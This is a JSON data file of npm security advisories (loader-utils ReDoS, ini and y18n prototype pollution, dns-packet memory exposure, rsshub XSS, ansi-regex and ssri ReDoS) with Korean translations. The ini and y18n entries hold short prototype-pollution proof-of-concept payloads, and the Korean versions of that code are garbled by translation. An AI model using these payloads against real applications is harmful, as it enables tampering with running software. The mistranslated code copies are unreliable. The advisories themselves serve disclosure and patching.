    "description": "A regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils via the resourcePath variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1.",
    "identifiers": "GHSA : GHSA-hhq3-ff78-jv3g\nCVE : CVE-2022-37599",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:09:48Z",
    "publishedAt": "2022-10-12T12:00:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37599\nhttps://github.com/webpack/loader-utils/issues/211\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L38\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L83\nhttps://github.com/webpack/loader-utils/issues/216\nhttps://github.com/webpack/loader-utils/commit/17cbf8fa8989c1cb45bdd2997aa524729475f1fa\nhttps://github.com/webpack/loader-utils/commit/ac09944dfacd7c4497ef692894b09e63e09a5eeb\nhttps://github.com/webpack/loader-utils/commit/d2d752d59629daee38f34b24307221349c490eb1\nhttps://github.com/advisories/GHSA-hhq3-ff78-jv3g",
    "name": "loader-utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.2.1",
    "identifier": "3.2.1",
    "descriptionKR": "정규식 서비스 거부(ReDoS) 결함이 interpolateName.js의 resourcePath 변수를 통해 webpack loader-utils의 interpolateName.js에 있는 함수 interpolateName에서 발견되었습니다. 잘못 또는 악의적으로 구성된 문자열을 사용하여 시스템을 충돌시키거나 처리하는 데 불균형한 시간이 걸리는 조작된 요청을 보낼 수 있습니다. 이 문제는 버전 1.4.2, 2.0.4 및 3.2.1에서 패치되었습니다."
  },
  {
    "description": "A regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils via the resourcePath variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1.",
    "identifiers": "GHSA : GHSA-hhq3-ff78-jv3g\nCVE : CVE-2022-37599",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:09:48Z",
    "publishedAt": "2022-10-12T12:00:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37599\nhttps://github.com/webpack/loader-utils/issues/211\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L38\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L83\nhttps://github.com/webpack/loader-utils/issues/216\nhttps://github.com/webpack/loader-utils/commit/17cbf8fa8989c1cb45bdd2997aa524729475f1fa\nhttps://github.com/webpack/loader-utils/commit/ac09944dfacd7c4497ef692894b09e63e09a5eeb\nhttps://github.com/webpack/loader-utils/commit/d2d752d59629daee38f34b24307221349c490eb1\nhttps://github.com/advisories/GHSA-hhq3-ff78-jv3g",
    "name": "loader-utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.0.4",
    "identifier": "2.0.4",
    "descriptionKR": "정규식 서비스 거부(ReDoS) 결함이 interpolateName.js의 resourcePath 변수를 통해 webpack loader-utils의 interpolateName.js에 있는 함수 interpolateName에서 발견되었습니다. 잘못 또는 악의적으로 구성된 문자열을 사용하여 시스템을 충돌시키거나 처리하는 데 불균형한 시간이 걸리는 조작된 요청을 보낼 수 있습니다. 이 문제는 버전 1.4.2, 2.0.4 및 3.2.1에서 패치되었습니다."
  },
  {
    "description": "A regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils via the resourcePath variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1.",
    "identifiers": "GHSA : GHSA-hhq3-ff78-jv3g\nCVE : CVE-2022-37599",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:09:48Z",
    "publishedAt": "2022-10-12T12:00:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37599\nhttps://github.com/webpack/loader-utils/issues/211\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L38\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L83\nhttps://github.com/webpack/loader-utils/issues/216\nhttps://github.com/webpack/loader-utils/commit/17cbf8fa8989c1cb45bdd2997aa524729475f1fa\nhttps://github.com/webpack/loader-utils/commit/ac09944dfacd7c4497ef692894b09e63e09a5eeb\nhttps://github.com/webpack/loader-utils/commit/d2d752d59629daee38f34b24307221349c490eb1\nhttps://github.com/advisories/GHSA-hhq3-ff78-jv3g",
    "name": "loader-utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.0, < 1.4.2",
    "identifier": "1.4.2",
    "descriptionKR": "정규식 서비스 거부(ReDoS) 결함이 interpolateName.js의 resourcePath 변수를 통해 webpack loader-utils의 interpolateName.js에 있는 함수 interpolateName에서 발견되었습니다. 잘못 또는 악의적으로 구성된 문자열을 사용하여 시스템을 충돌시키거나 처리하는 데 불균형한 시간이 걸리는 조작된 요청을 보낼 수 있습니다. 이 문제는 버전 1.4.2, 2.0.4 및 3.2.1에서 패치되었습니다."
  },
  {
    "description": "### Overview\nThe `ini` npm package before version 1.3.6 has a Prototype Pollution vulnerability.\n\nIf an attacker submits a malicious INI file to an application that parses it with `ini.parse`, they will pollute the prototype on the application. This can be exploited further depending on the context.\n\n### Patches\n\nThis has been patched in 1.3.6.\n\n### Steps to reproduce\n\npayload.ini\n```\n[__proto__]\npolluted = \"polluted\"\n```\n\npoc.js:\n```\nvar fs = require('fs')\nvar ini = require('ini')\n\nvar parsed = ini.parse(fs.readFileSync('./payload.ini', 'utf-8'))\nconsole.log(parsed)\nconsole.log(parsed.__proto__)\nconsole.log(polluted)\n```\n\n```\n> node poc.js\n{}\n{ polluted: 'polluted' }\n{ polluted: 'polluted' }\npolluted\n```",
    "identifiers": "GHSA : GHSA-qqgx-2p2h-9c37\nCVE : CVE-2020-7788",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T21:03:59Z",
    "publishedAt": "2020-12-10T16:53:45Z",
    "references": "https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1\nhttps://www.npmjs.com/advisories/1589\nhttps://snyk.io/vuln/SNYK-JS-INI-1048974\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-7788\nhttps://lists.debian.org/debian-lts-announce/2020/12/msg00032.html\nhttps://github.com/advisories/GHSA-qqgx-2p2h-9c37",
    "name": "ini",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.6",
    "identifier": "1.3.6",
    "descriptionKR": "### 개요\n버전 1.3.6 이전의 `ini` npm 패키지에는 Prototype Pollution 취약점이 있습니다.\n\n공격자가 악성 INI 파일을 'ini.parse'로 구문 분석하는 애플리케이션에 제출하면 애플리케이션의 프로토타입을 오염시킵니다. 이는 상황에 따라 추가로 악용될 수 있습니다.\n\n### 패치\n\n이것은 1.3.6에서 패치되었습니다.\n\n### 재현 단계\n\n페이로드.ini\n```\n[__proto__]\n오염된 = \"오염된\"\n```\n\npoc.js:\n```\nvar fs = 요구('fs')\nvar ini = 요구('ini')\n\nvar parsed = ini.parse(fs.readFileSync('./payload.ini', 'utf-8'))\nconsole.log(파싱됨)\nconsole.log(구문 분석됨.__proto__)\nconsole.log(오염됨)\n```\n\n```\n> 노드 poc.js\n{}\n{ 오염된: '오염된' }\n{ 오염된: '오염된' }\n오염된\n```"
  },
  {
    "description": "This affects the package dns-packet before versions 1.3.2 and 5.2.2. It creates buffers with allocUnsafe and does not always fill them before forming network packets. This can expose internal application memory over unencrypted network when querying crafted invalid domain names.",
    "identifiers": "GHSA : GHSA-3wcq-x3mq-6r9p\nCVE : CVE-2021-23386",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T20:58:33Z",
    "publishedAt": "2021-05-24T19:51:04Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23386\nhttps://github.com/mafintosh/dns-packet/commit/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56\nhttps://hackerone.com/bugs?subject=user&amp%3Breport_id=968858\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1295719\nhttps://snyk.io/vuln/SNYK-JS-DNSPACKET-1293563\nhttps://github.com/mafintosh/dns-packet/commit/0d0d593f8df4e2712c43957a6c62e95047f12b2d\nhttps://github.com/advisories/GHSA-3wcq-x3mq-6r9p",
    "name": "dns-packet",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 5.4.0",
    "identifier": "5.4.0",
    "descriptionKR": "이는 버전 1.3.2 및 5.2.2 이전의 패키지 dns-packet에 영향을 미칩니다. allocUnsafe로 버퍼를 만들고 네트워크 패킷을 형성하기 전에 버퍼를 항상 채우지는 않습니다. 이렇게 하면 조작된 잘못된 도메인 이름을 쿼리할 때 암호화되지 않은 네트워크를 통해 내부 애플리케이션 메모리가 노출될 수 있습니다."
  },
  {
    "description": "This affects the package dns-packet before versions 1.3.2 and 5.2.2. It creates buffers with allocUnsafe and does not always fill them before forming network packets. This can expose internal application memory over unencrypted network when querying crafted invalid domain names.",
    "identifiers": "GHSA : GHSA-3wcq-x3mq-6r9p\nCVE : CVE-2021-23386",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T20:58:33Z",
    "publishedAt": "2021-05-24T19:51:04Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23386\nhttps://github.com/mafintosh/dns-packet/commit/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56\nhttps://hackerone.com/bugs?subject=user&amp%3Breport_id=968858\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1295719\nhttps://snyk.io/vuln/SNYK-JS-DNSPACKET-1293563\nhttps://github.com/mafintosh/dns-packet/commit/0d0d593f8df4e2712c43957a6c62e95047f12b2d\nhttps://github.com/advisories/GHSA-3wcq-x3mq-6r9p",
    "name": "dns-packet",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.2",
    "identifier": "1.3.2",
    "descriptionKR": "이는 버전 1.3.2 및 5.2.2 이전의 패키지 dns-packet에 영향을 미칩니다. allocUnsafe로 버퍼를 만들고 네트워크 패킷을 형성하기 전에 버퍼를 항상 채우지는 않습니다. 이렇게 하면 조작된 잘못된 도메인 이름을 쿼리할 때 암호화되지 않은 네트워크를 통해 내부 애플리케이션 메모리가 노출될 수 있습니다."
  },
  {
    "description": "### Overview\n\nThe npm package `y18n` before versions 3.2.2, 4.0.1, and 5.0.5 is vulnerable to Prototype Pollution. \n\n### POC\n\n```\nconst y18n = require('y18n')();\n\ny18n.setLocale('__proto__');\ny18n.updateLocale({polluted: true});\n\nconsole.log(polluted); // true\n```\n\n### Recommendation\n\nUpgrade to version 3.2.2, 4.0.1, 5.0.5 or later.",
    "identifiers": "GHSA : GHSA-c4w7-xm78-47vh\nCVE : CVE-2020-7774",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T20:55:32Z",
    "publishedAt": "2021-03-29T16:05:12Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7774\nhttps://github.com/yargs/y18n/issues/96\nhttps://github.com/yargs/y18n/pull/108\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1038306\nhttps://snyk.io/vuln/SNYK-JS-Y18N-1021887\nhttps://github.com/yargs/y18n/commit/a9ac604abf756dec9687be3843e2c93bfe581f25\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/yargs/y18n/commit/90401eea9062ad498f4f792e3fff8008c4c193a3\nhttps://github.com/advisories/GHSA-c4w7-xm78-47vh",
    "name": "y18n",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.0.5",
    "identifier": "5.0.5",
    "descriptionKR": "### 개요\n\n버전 3.2.2, 4.0.1 및 5.0.5 이전의 npm 패키지 `y18n`은 Prototype Pollution에 취약합니다.\n\n### POC\n\n```\nconst y18n = 요구('y18n')();\n\ny18n.setLocale('__proto__');\ny18n.updateLocale({오염: 참});\n\nconsole.log(오염됨); // 진실\n```\n\n### 추천\n\n버전 3.2.2, 4.0.1, 5.0.5 이상으로 업그레이드하십시오."
  },
  {
    "description": "### Overview\n\nThe npm package `y18n` before versions 3.2.2, 4.0.1, and 5.0.5 is vulnerable to Prototype Pollution. \n\n### POC\n\n```\nconst y18n = require('y18n')();\n\ny18n.setLocale('__proto__');\ny18n.updateLocale({polluted: true});\n\nconsole.log(polluted); // true\n```\n\n### Recommendation\n\nUpgrade to version 3.2.2, 4.0.1, 5.0.5 or later.",
    "identifiers": "GHSA : GHSA-c4w7-xm78-47vh\nCVE : CVE-2020-7774",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T20:55:32Z",
    "publishedAt": "2021-03-29T16:05:12Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7774\nhttps://github.com/yargs/y18n/issues/96\nhttps://github.com/yargs/y18n/pull/108\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1038306\nhttps://snyk.io/vuln/SNYK-JS-Y18N-1021887\nhttps://github.com/yargs/y18n/commit/a9ac604abf756dec9687be3843e2c93bfe581f25\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/yargs/y18n/commit/90401eea9062ad498f4f792e3fff8008c4c193a3\nhttps://github.com/advisories/GHSA-c4w7-xm78-47vh",
    "name": "y18n",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 4.0.0",
    "identifier": "4.0.1",
    "descriptionKR": "### 개요\n\n버전 3.2.2, 4.0.1 및 5.0.5 이전의 npm 패키지 `y18n`은 Prototype Pollution에 취약합니다.\n\n### POC\n\n```\nconst y18n = 요구('y18n')();\n\ny18n.setLocale('__proto__');\ny18n.updateLocale({오염: 참});\n\nconsole.log(오염됨); // 진실\n```\n\n### 추천\n\n버전 3.2.2, 4.0.1, 5.0.5 이상으로 업그레이드하십시오."
  },
  {
    "description": "### Overview\n\nThe npm package `y18n` before versions 3.2.2, 4.0.1, and 5.0.5 is vulnerable to Prototype Pollution. \n\n### POC\n\n```\nconst y18n = require('y18n')();\n\ny18n.setLocale('__proto__');\ny18n.updateLocale({polluted: true});\n\nconsole.log(polluted); // true\n```\n\n### Recommendation\n\nUpgrade to version 3.2.2, 4.0.1, 5.0.5 or later.",
    "identifiers": "GHSA : GHSA-c4w7-xm78-47vh\nCVE : CVE-2020-7774",
    "severity": "HIGH",
    "updatedAt": "2023-03-02T20:55:32Z",
    "publishedAt": "2021-03-29T16:05:12Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7774\nhttps://github.com/yargs/y18n/issues/96\nhttps://github.com/yargs/y18n/pull/108\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1038306\nhttps://snyk.io/vuln/SNYK-JS-Y18N-1021887\nhttps://github.com/yargs/y18n/commit/a9ac604abf756dec9687be3843e2c93bfe581f25\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/yargs/y18n/commit/90401eea9062ad498f4f792e3fff8008c4c193a3\nhttps://github.com/advisories/GHSA-c4w7-xm78-47vh",
    "name": "y18n",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.2.2",
    "identifier": "3.2.2",
    "descriptionKR": "### 개요\n\n버전 3.2.2, 4.0.1 및 5.0.5 이전의 npm 패키지 `y18n`은 Prototype Pollution에 취약합니다.\n\n### POC\n\n```\nconst y18n = 요구('y18n')();\n\ny18n.setLocale('__proto__');\ny18n.updateLocale({오염: 참});\n\nconsole.log(오염됨); // 진실\n```\n\n### 추천\n\n버전 3.2.2, 4.0.1, 5.0.5 이상으로 업그레이드하십시오."
  },
  {
    "description": "A vulnerability in Imperative framework which allows already-privileged local actors to execute arbitrary shell commands via plugin install/update commands, or maliciously formed environment variables. Impacts Zowe CLI.",
    "identifiers": "GHSA : GHSA-6q8m-42qq-64r7\nCVE : CVE-2021-4326",
    "severity": "LOW",
    "updatedAt": "2023-03-13T15:31:06Z",
    "publishedAt": "2023-03-01T09:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4326\nhttps://github.com/zowe/imperative/pull/900\nhttps://github.com/zowe/imperative/pull/902\nhttps://github.com/zowe/imperative/commits/v4.18.10\nhttps://github.com/zowe/imperative/commits/v5.7.1\nhttps://github.com/advisories/GHSA-6q8m-42qq-64r7",
    "name": "@zowe/imperative",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.18.10",
    "identifier": "4.18.10",
    "descriptionKR": "이미 권한이 있는 로컬 행위자가 플러그인 설치/업데이트 명령 또는 악의적으로 구성된 환경 변수를 통해 임의의 셸 명령을 실행할 수 있도록 허용하는 명령형 프레임워크의 취약점입니다. Zowe CLI에 영향을 미칩니다."
  },
  {
    "description": "A vulnerability in Imperative framework which allows already-privileged local actors to execute arbitrary shell commands via plugin install/update commands, or maliciously formed environment variables. Impacts Zowe CLI.",
    "identifiers": "GHSA : GHSA-6q8m-42qq-64r7\nCVE : CVE-2021-4326",
    "severity": "LOW",
    "updatedAt": "2023-03-13T15:31:06Z",
    "publishedAt": "2023-03-01T09:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4326\nhttps://github.com/zowe/imperative/pull/900\nhttps://github.com/zowe/imperative/pull/902\nhttps://github.com/zowe/imperative/commits/v4.18.10\nhttps://github.com/zowe/imperative/commits/v5.7.1\nhttps://github.com/advisories/GHSA-6q8m-42qq-64r7",
    "name": "@zowe/imperative",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.7.1",
    "identifier": "5.7.1",
    "descriptionKR": "이미 권한이 있는 로컬 행위자가 플러그인 설치/업데이트 명령 또는 악의적으로 구성된 환경 변수를 통해 임의의 셸 명령을 실행할 수 있도록 허용하는 명령형 프레임워크의 취약점입니다. Zowe CLI에 영향을 미칩니다."
  },
  {
    "description": "### Impact\n\nWhen the URL parameters contain certain special characters, it returns an error page that does not properly handle XSS vulnerabilities, allowing for the execution of arbitrary JavaScript code.\n\nUsers who access the deliberately constructed URL are affected.\n\n### Patches\n\nThis vulnerability was fixed in version c910c4d28717fb860fbe064736641f379fab2c91. Please upgrade to this or a later version.\n\n### Workarounds\n\nNo.\n",
    "identifiers": "GHSA : GHSA-32gr-4cq6-5w5q\nCVE : CVE-2023-26491",
    "severity": "MODERATE",
    "updatedAt": "2023-03-13T19:18:33Z",
    "publishedAt": "2023-03-01T18:02:28Z",
    "references": "https://github.com/DIYgod/RSSHub/security/advisories/GHSA-32gr-4cq6-5w5q\nhttps://github.com/DIYgod/RSSHub/commit/c910c4d28717fb860fbe064736641f379fab2c91\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-26491\nhttps://github.com/advisories/GHSA-32gr-4cq6-5w5q",
    "name": "rsshub",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.0-master.c910c4d",
    "identifier": "1.0.0-master.c910c4d",
    "descriptionKR": "### 영향\n\nURL 매개 변수에 특정 특수 문자가 포함된 경우 XSS 취약점을 제대로 처리하지 못하는 오류 페이지를 반환하여 임의의 JavaScript 코드 실행을 허용합니다.\n\n의도적으로 구성된 URL에 액세스하는 사용자는 영향을 받습니다.\n\n### 패치\n\n이 취약점은 버전 c910c4d28717fb860fbe064736641f379fab2c91에서 수정되었습니다. 이 버전 또는 이후 버전으로 업그레이드하십시오.\n\n### 해결 방법\n\n아니요."
  },
  {
    "description": "ansi-regex is vulnerable to Inefficient Regular Expression Complexity which could lead to a denial of service.",
    "identifiers": "GHSA : GHSA-93q8-gq69-wqmw\nCVE : CVE-2021-3807",
    "severity": "HIGH",
    "updatedAt": "2023-02-28T23:06:41Z",
    "publishedAt": "2021-09-20T20:20:09Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3807\nhttps://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9\nhttps://huntr.dev/bounties/5b3cf33b-ede0-4398-9974-800876dfd994\nhttps://github.com/chalk/ansi-regex/issues/38#issuecomment-924086311\nhttps://app.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908\nhttps://github.com/chalk/ansi-regex/issues/38#issuecomment-925924774\nhttps://github.com/chalk/ansi-regex/releases/tag/v6.0.1\nhttps://www.oracle.com/security-alerts/cpuapr2022.html\nhttps://security.netapp.com/advisory/ntap-20221014-0002/\nhttps://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1\nhttps://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a\nhttps://github.com/chalk/ansi-regex/commit/c3c0b3f2736b9c01feec0fef33980c43720dcde8\nhttps://github.com/advisories/GHSA-93q8-gq69-wqmw",
    "name": "ansi-regex",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.0.1",
    "identifier": "3.0.1",
    "descriptionKR": "ansi-regex는 서비스 거부로 이어질 수 있는 비효율적인 정규식 복잡성에 취약합니다."
  },
  {
    "description": "ansi-regex is vulnerable to Inefficient Regular Expression Complexity which could lead to a denial of service.",
    "identifiers": "GHSA : GHSA-93q8-gq69-wqmw\nCVE : CVE-2021-3807",
    "severity": "HIGH",
    "updatedAt": "2023-02-28T23:06:41Z",
    "publishedAt": "2021-09-20T20:20:09Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3807\nhttps://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9\nhttps://huntr.dev/bounties/5b3cf33b-ede0-4398-9974-800876dfd994\nhttps://github.com/chalk/ansi-regex/issues/38#issuecomment-924086311\nhttps://app.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908\nhttps://github.com/chalk/ansi-regex/issues/38#issuecomment-925924774\nhttps://github.com/chalk/ansi-regex/releases/tag/v6.0.1\nhttps://www.oracle.com/security-alerts/cpuapr2022.html\nhttps://security.netapp.com/advisory/ntap-20221014-0002/\nhttps://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1\nhttps://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a\nhttps://github.com/chalk/ansi-regex/commit/c3c0b3f2736b9c01feec0fef33980c43720dcde8\nhttps://github.com/advisories/GHSA-93q8-gq69-wqmw",
    "name": "ansi-regex",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.1.1",
    "identifier": "4.1.1",
    "descriptionKR": "ansi-regex는 서비스 거부로 이어질 수 있는 비효율적인 정규식 복잡성에 취약합니다."
  },
  {
    "description": "ansi-regex is vulnerable to Inefficient Regular Expression Complexity which could lead to a denial of service.",
    "identifiers": "GHSA : GHSA-93q8-gq69-wqmw\nCVE : CVE-2021-3807",
    "severity": "HIGH",
    "updatedAt": "2023-02-28T23:06:41Z",
    "publishedAt": "2021-09-20T20:20:09Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3807\nhttps://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9\nhttps://huntr.dev/bounties/5b3cf33b-ede0-4398-9974-800876dfd994\nhttps://github.com/chalk/ansi-regex/issues/38#issuecomment-924086311\nhttps://app.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908\nhttps://github.com/chalk/ansi-regex/issues/38#issuecomment-925924774\nhttps://github.com/chalk/ansi-regex/releases/tag/v6.0.1\nhttps://www.oracle.com/security-alerts/cpuapr2022.html\nhttps://security.netapp.com/advisory/ntap-20221014-0002/\nhttps://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1\nhttps://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a\nhttps://github.com/chalk/ansi-regex/commit/c3c0b3f2736b9c01feec0fef33980c43720dcde8\nhttps://github.com/advisories/GHSA-93q8-gq69-wqmw",
    "name": "ansi-regex",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.0.1",
    "identifier": "5.0.1",
    "descriptionKR": "ansi-regex는 서비스 거부로 이어질 수 있는 비효율적인 정규식 복잡성에 취약합니다."
  },
  {
    "description": "ansi-regex is vulnerable to Inefficient Regular Expression Complexity which could lead to a denial of service.",
    "identifiers": "GHSA : GHSA-93q8-gq69-wqmw\nCVE : CVE-2021-3807",
    "severity": "HIGH",
    "updatedAt": "2023-02-28T23:06:41Z",
    "publishedAt": "2021-09-20T20:20:09Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3807\nhttps://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9\nhttps://huntr.dev/bounties/5b3cf33b-ede0-4398-9974-800876dfd994\nhttps://github.com/chalk/ansi-regex/issues/38#issuecomment-924086311\nhttps://app.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908\nhttps://github.com/chalk/ansi-regex/issues/38#issuecomment-925924774\nhttps://github.com/chalk/ansi-regex/releases/tag/v6.0.1\nhttps://www.oracle.com/security-alerts/cpuapr2022.html\nhttps://security.netapp.com/advisory/ntap-20221014-0002/\nhttps://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1\nhttps://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a\nhttps://github.com/chalk/ansi-regex/commit/c3c0b3f2736b9c01feec0fef33980c43720dcde8\nhttps://github.com/advisories/GHSA-93q8-gq69-wqmw",
    "name": "ansi-regex",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.0.1",
    "identifier": "6.0.1",
    "descriptionKR": "ansi-regex는 서비스 거부로 이어질 수 있는 비효율적인 정규식 복잡성에 취약합니다."
  },
  {
    "description": "npm `ssri` 5.2.2-6.0.1 and 7.0.0-8.0.0, processes SRIs using a regular expression which is vulnerable to a denial of service. Malicious SRIs could take an extremely long time to process, leading to denial of service. This issue only affects consumers using the strict option.",
    "identifiers": "GHSA : GHSA-vx3p-948g-6vhq\nCVE : CVE-2021-27290",
    "severity": "HIGH",
    "updatedAt": "2023-02-28T22:51:14Z",
    "publishedAt": "2021-03-19T21:24:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-27290\nhttps://github.com/npm/ssri/commit/76e223317d971f19e4db8191865bdad5edee40d2\nhttps://doyensec.com/resources/Doyensec_Advisory_ssri_redos.pdf\nhttps://github.com/yetingli/SaveResults/blob/main/pdf/ssri-redos.pdf\nhttps://github.com/npm/ssri/commit/b30dfdb00bb94ddc49a25a85a18fb27afafdfbb1\nhttps://www.npmjs.com/package/ssri\nhttps://github.com/npm/ssri/pull/20#issuecomment-842677644\nhttps://npmjs.com\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/npm/ssri/commit/809c84d09ea87c3857fa171d42914586899d4538\nhttps://github.com/advisories/GHSA-vx3p-948g-6vhq",
    "name": "ssri",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 8.0.0",
    "identifier": "8.0.1",
    "descriptionKR": "npm `ssri` 5.2.2-6.0.1 및 7.0.0-8.0.0은 서비스 거부에 취약한 정규식을 사용하여 SRI를 처리합니다. 악성 SRI는 처리하는 데 매우 오랜 시간이 걸리며 서비스 거부로 이어질 수 있습니다. 이 문제는 strict 옵션을 사용하는 소비자에게만 영향을 미칩니다."
  },
  {
    "description": "npm `ssri` 5.2.2-6.0.1 and 7.0.0-8.0.0, processes SRIs using a regular expression which is vulnerable to a denial of service. Malicious SRIs could take an extremely long time to process, leading to denial of service. This issue only affects consumers using the strict option.",
    "identifiers": "GHSA : GHSA-vx3p-948g-6vhq\nCVE : CVE-2021-27290",
    "severity": "HIGH",
    "updatedAt": "2023-02-28T22:51:14Z",
    "publishedAt": "2021-03-19T21:24:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-27290\nhttps://github.com/npm/ssri/commit/76e223317d971f19e4db8191865bdad5edee40d2\nhttps://doyensec.com/resources/Doyensec_Advisory_ssri_redos.pdf\nhttps://github.com/yetingli/SaveResults/blob/main/pdf/ssri-redos.pdf\nhttps://github.com/npm/ssri/commit/b30dfdb00bb94ddc49a25a85a18fb27afafdfbb1\nhttps://www.npmjs.com/package/ssri\nhttps://github.com/npm/ssri/pull/20#issuecomment-842677644\nhttps://npmjs.com\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/npm/ssri/commit/809c84d09ea87c3857fa171d42914586899d4538\nhttps://github.com/advisories/GHSA-vx3p-948g-6vhq",
    "name": "ssri",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 7.0.0, < 7.1.1",
    "identifier": "7.1.1",
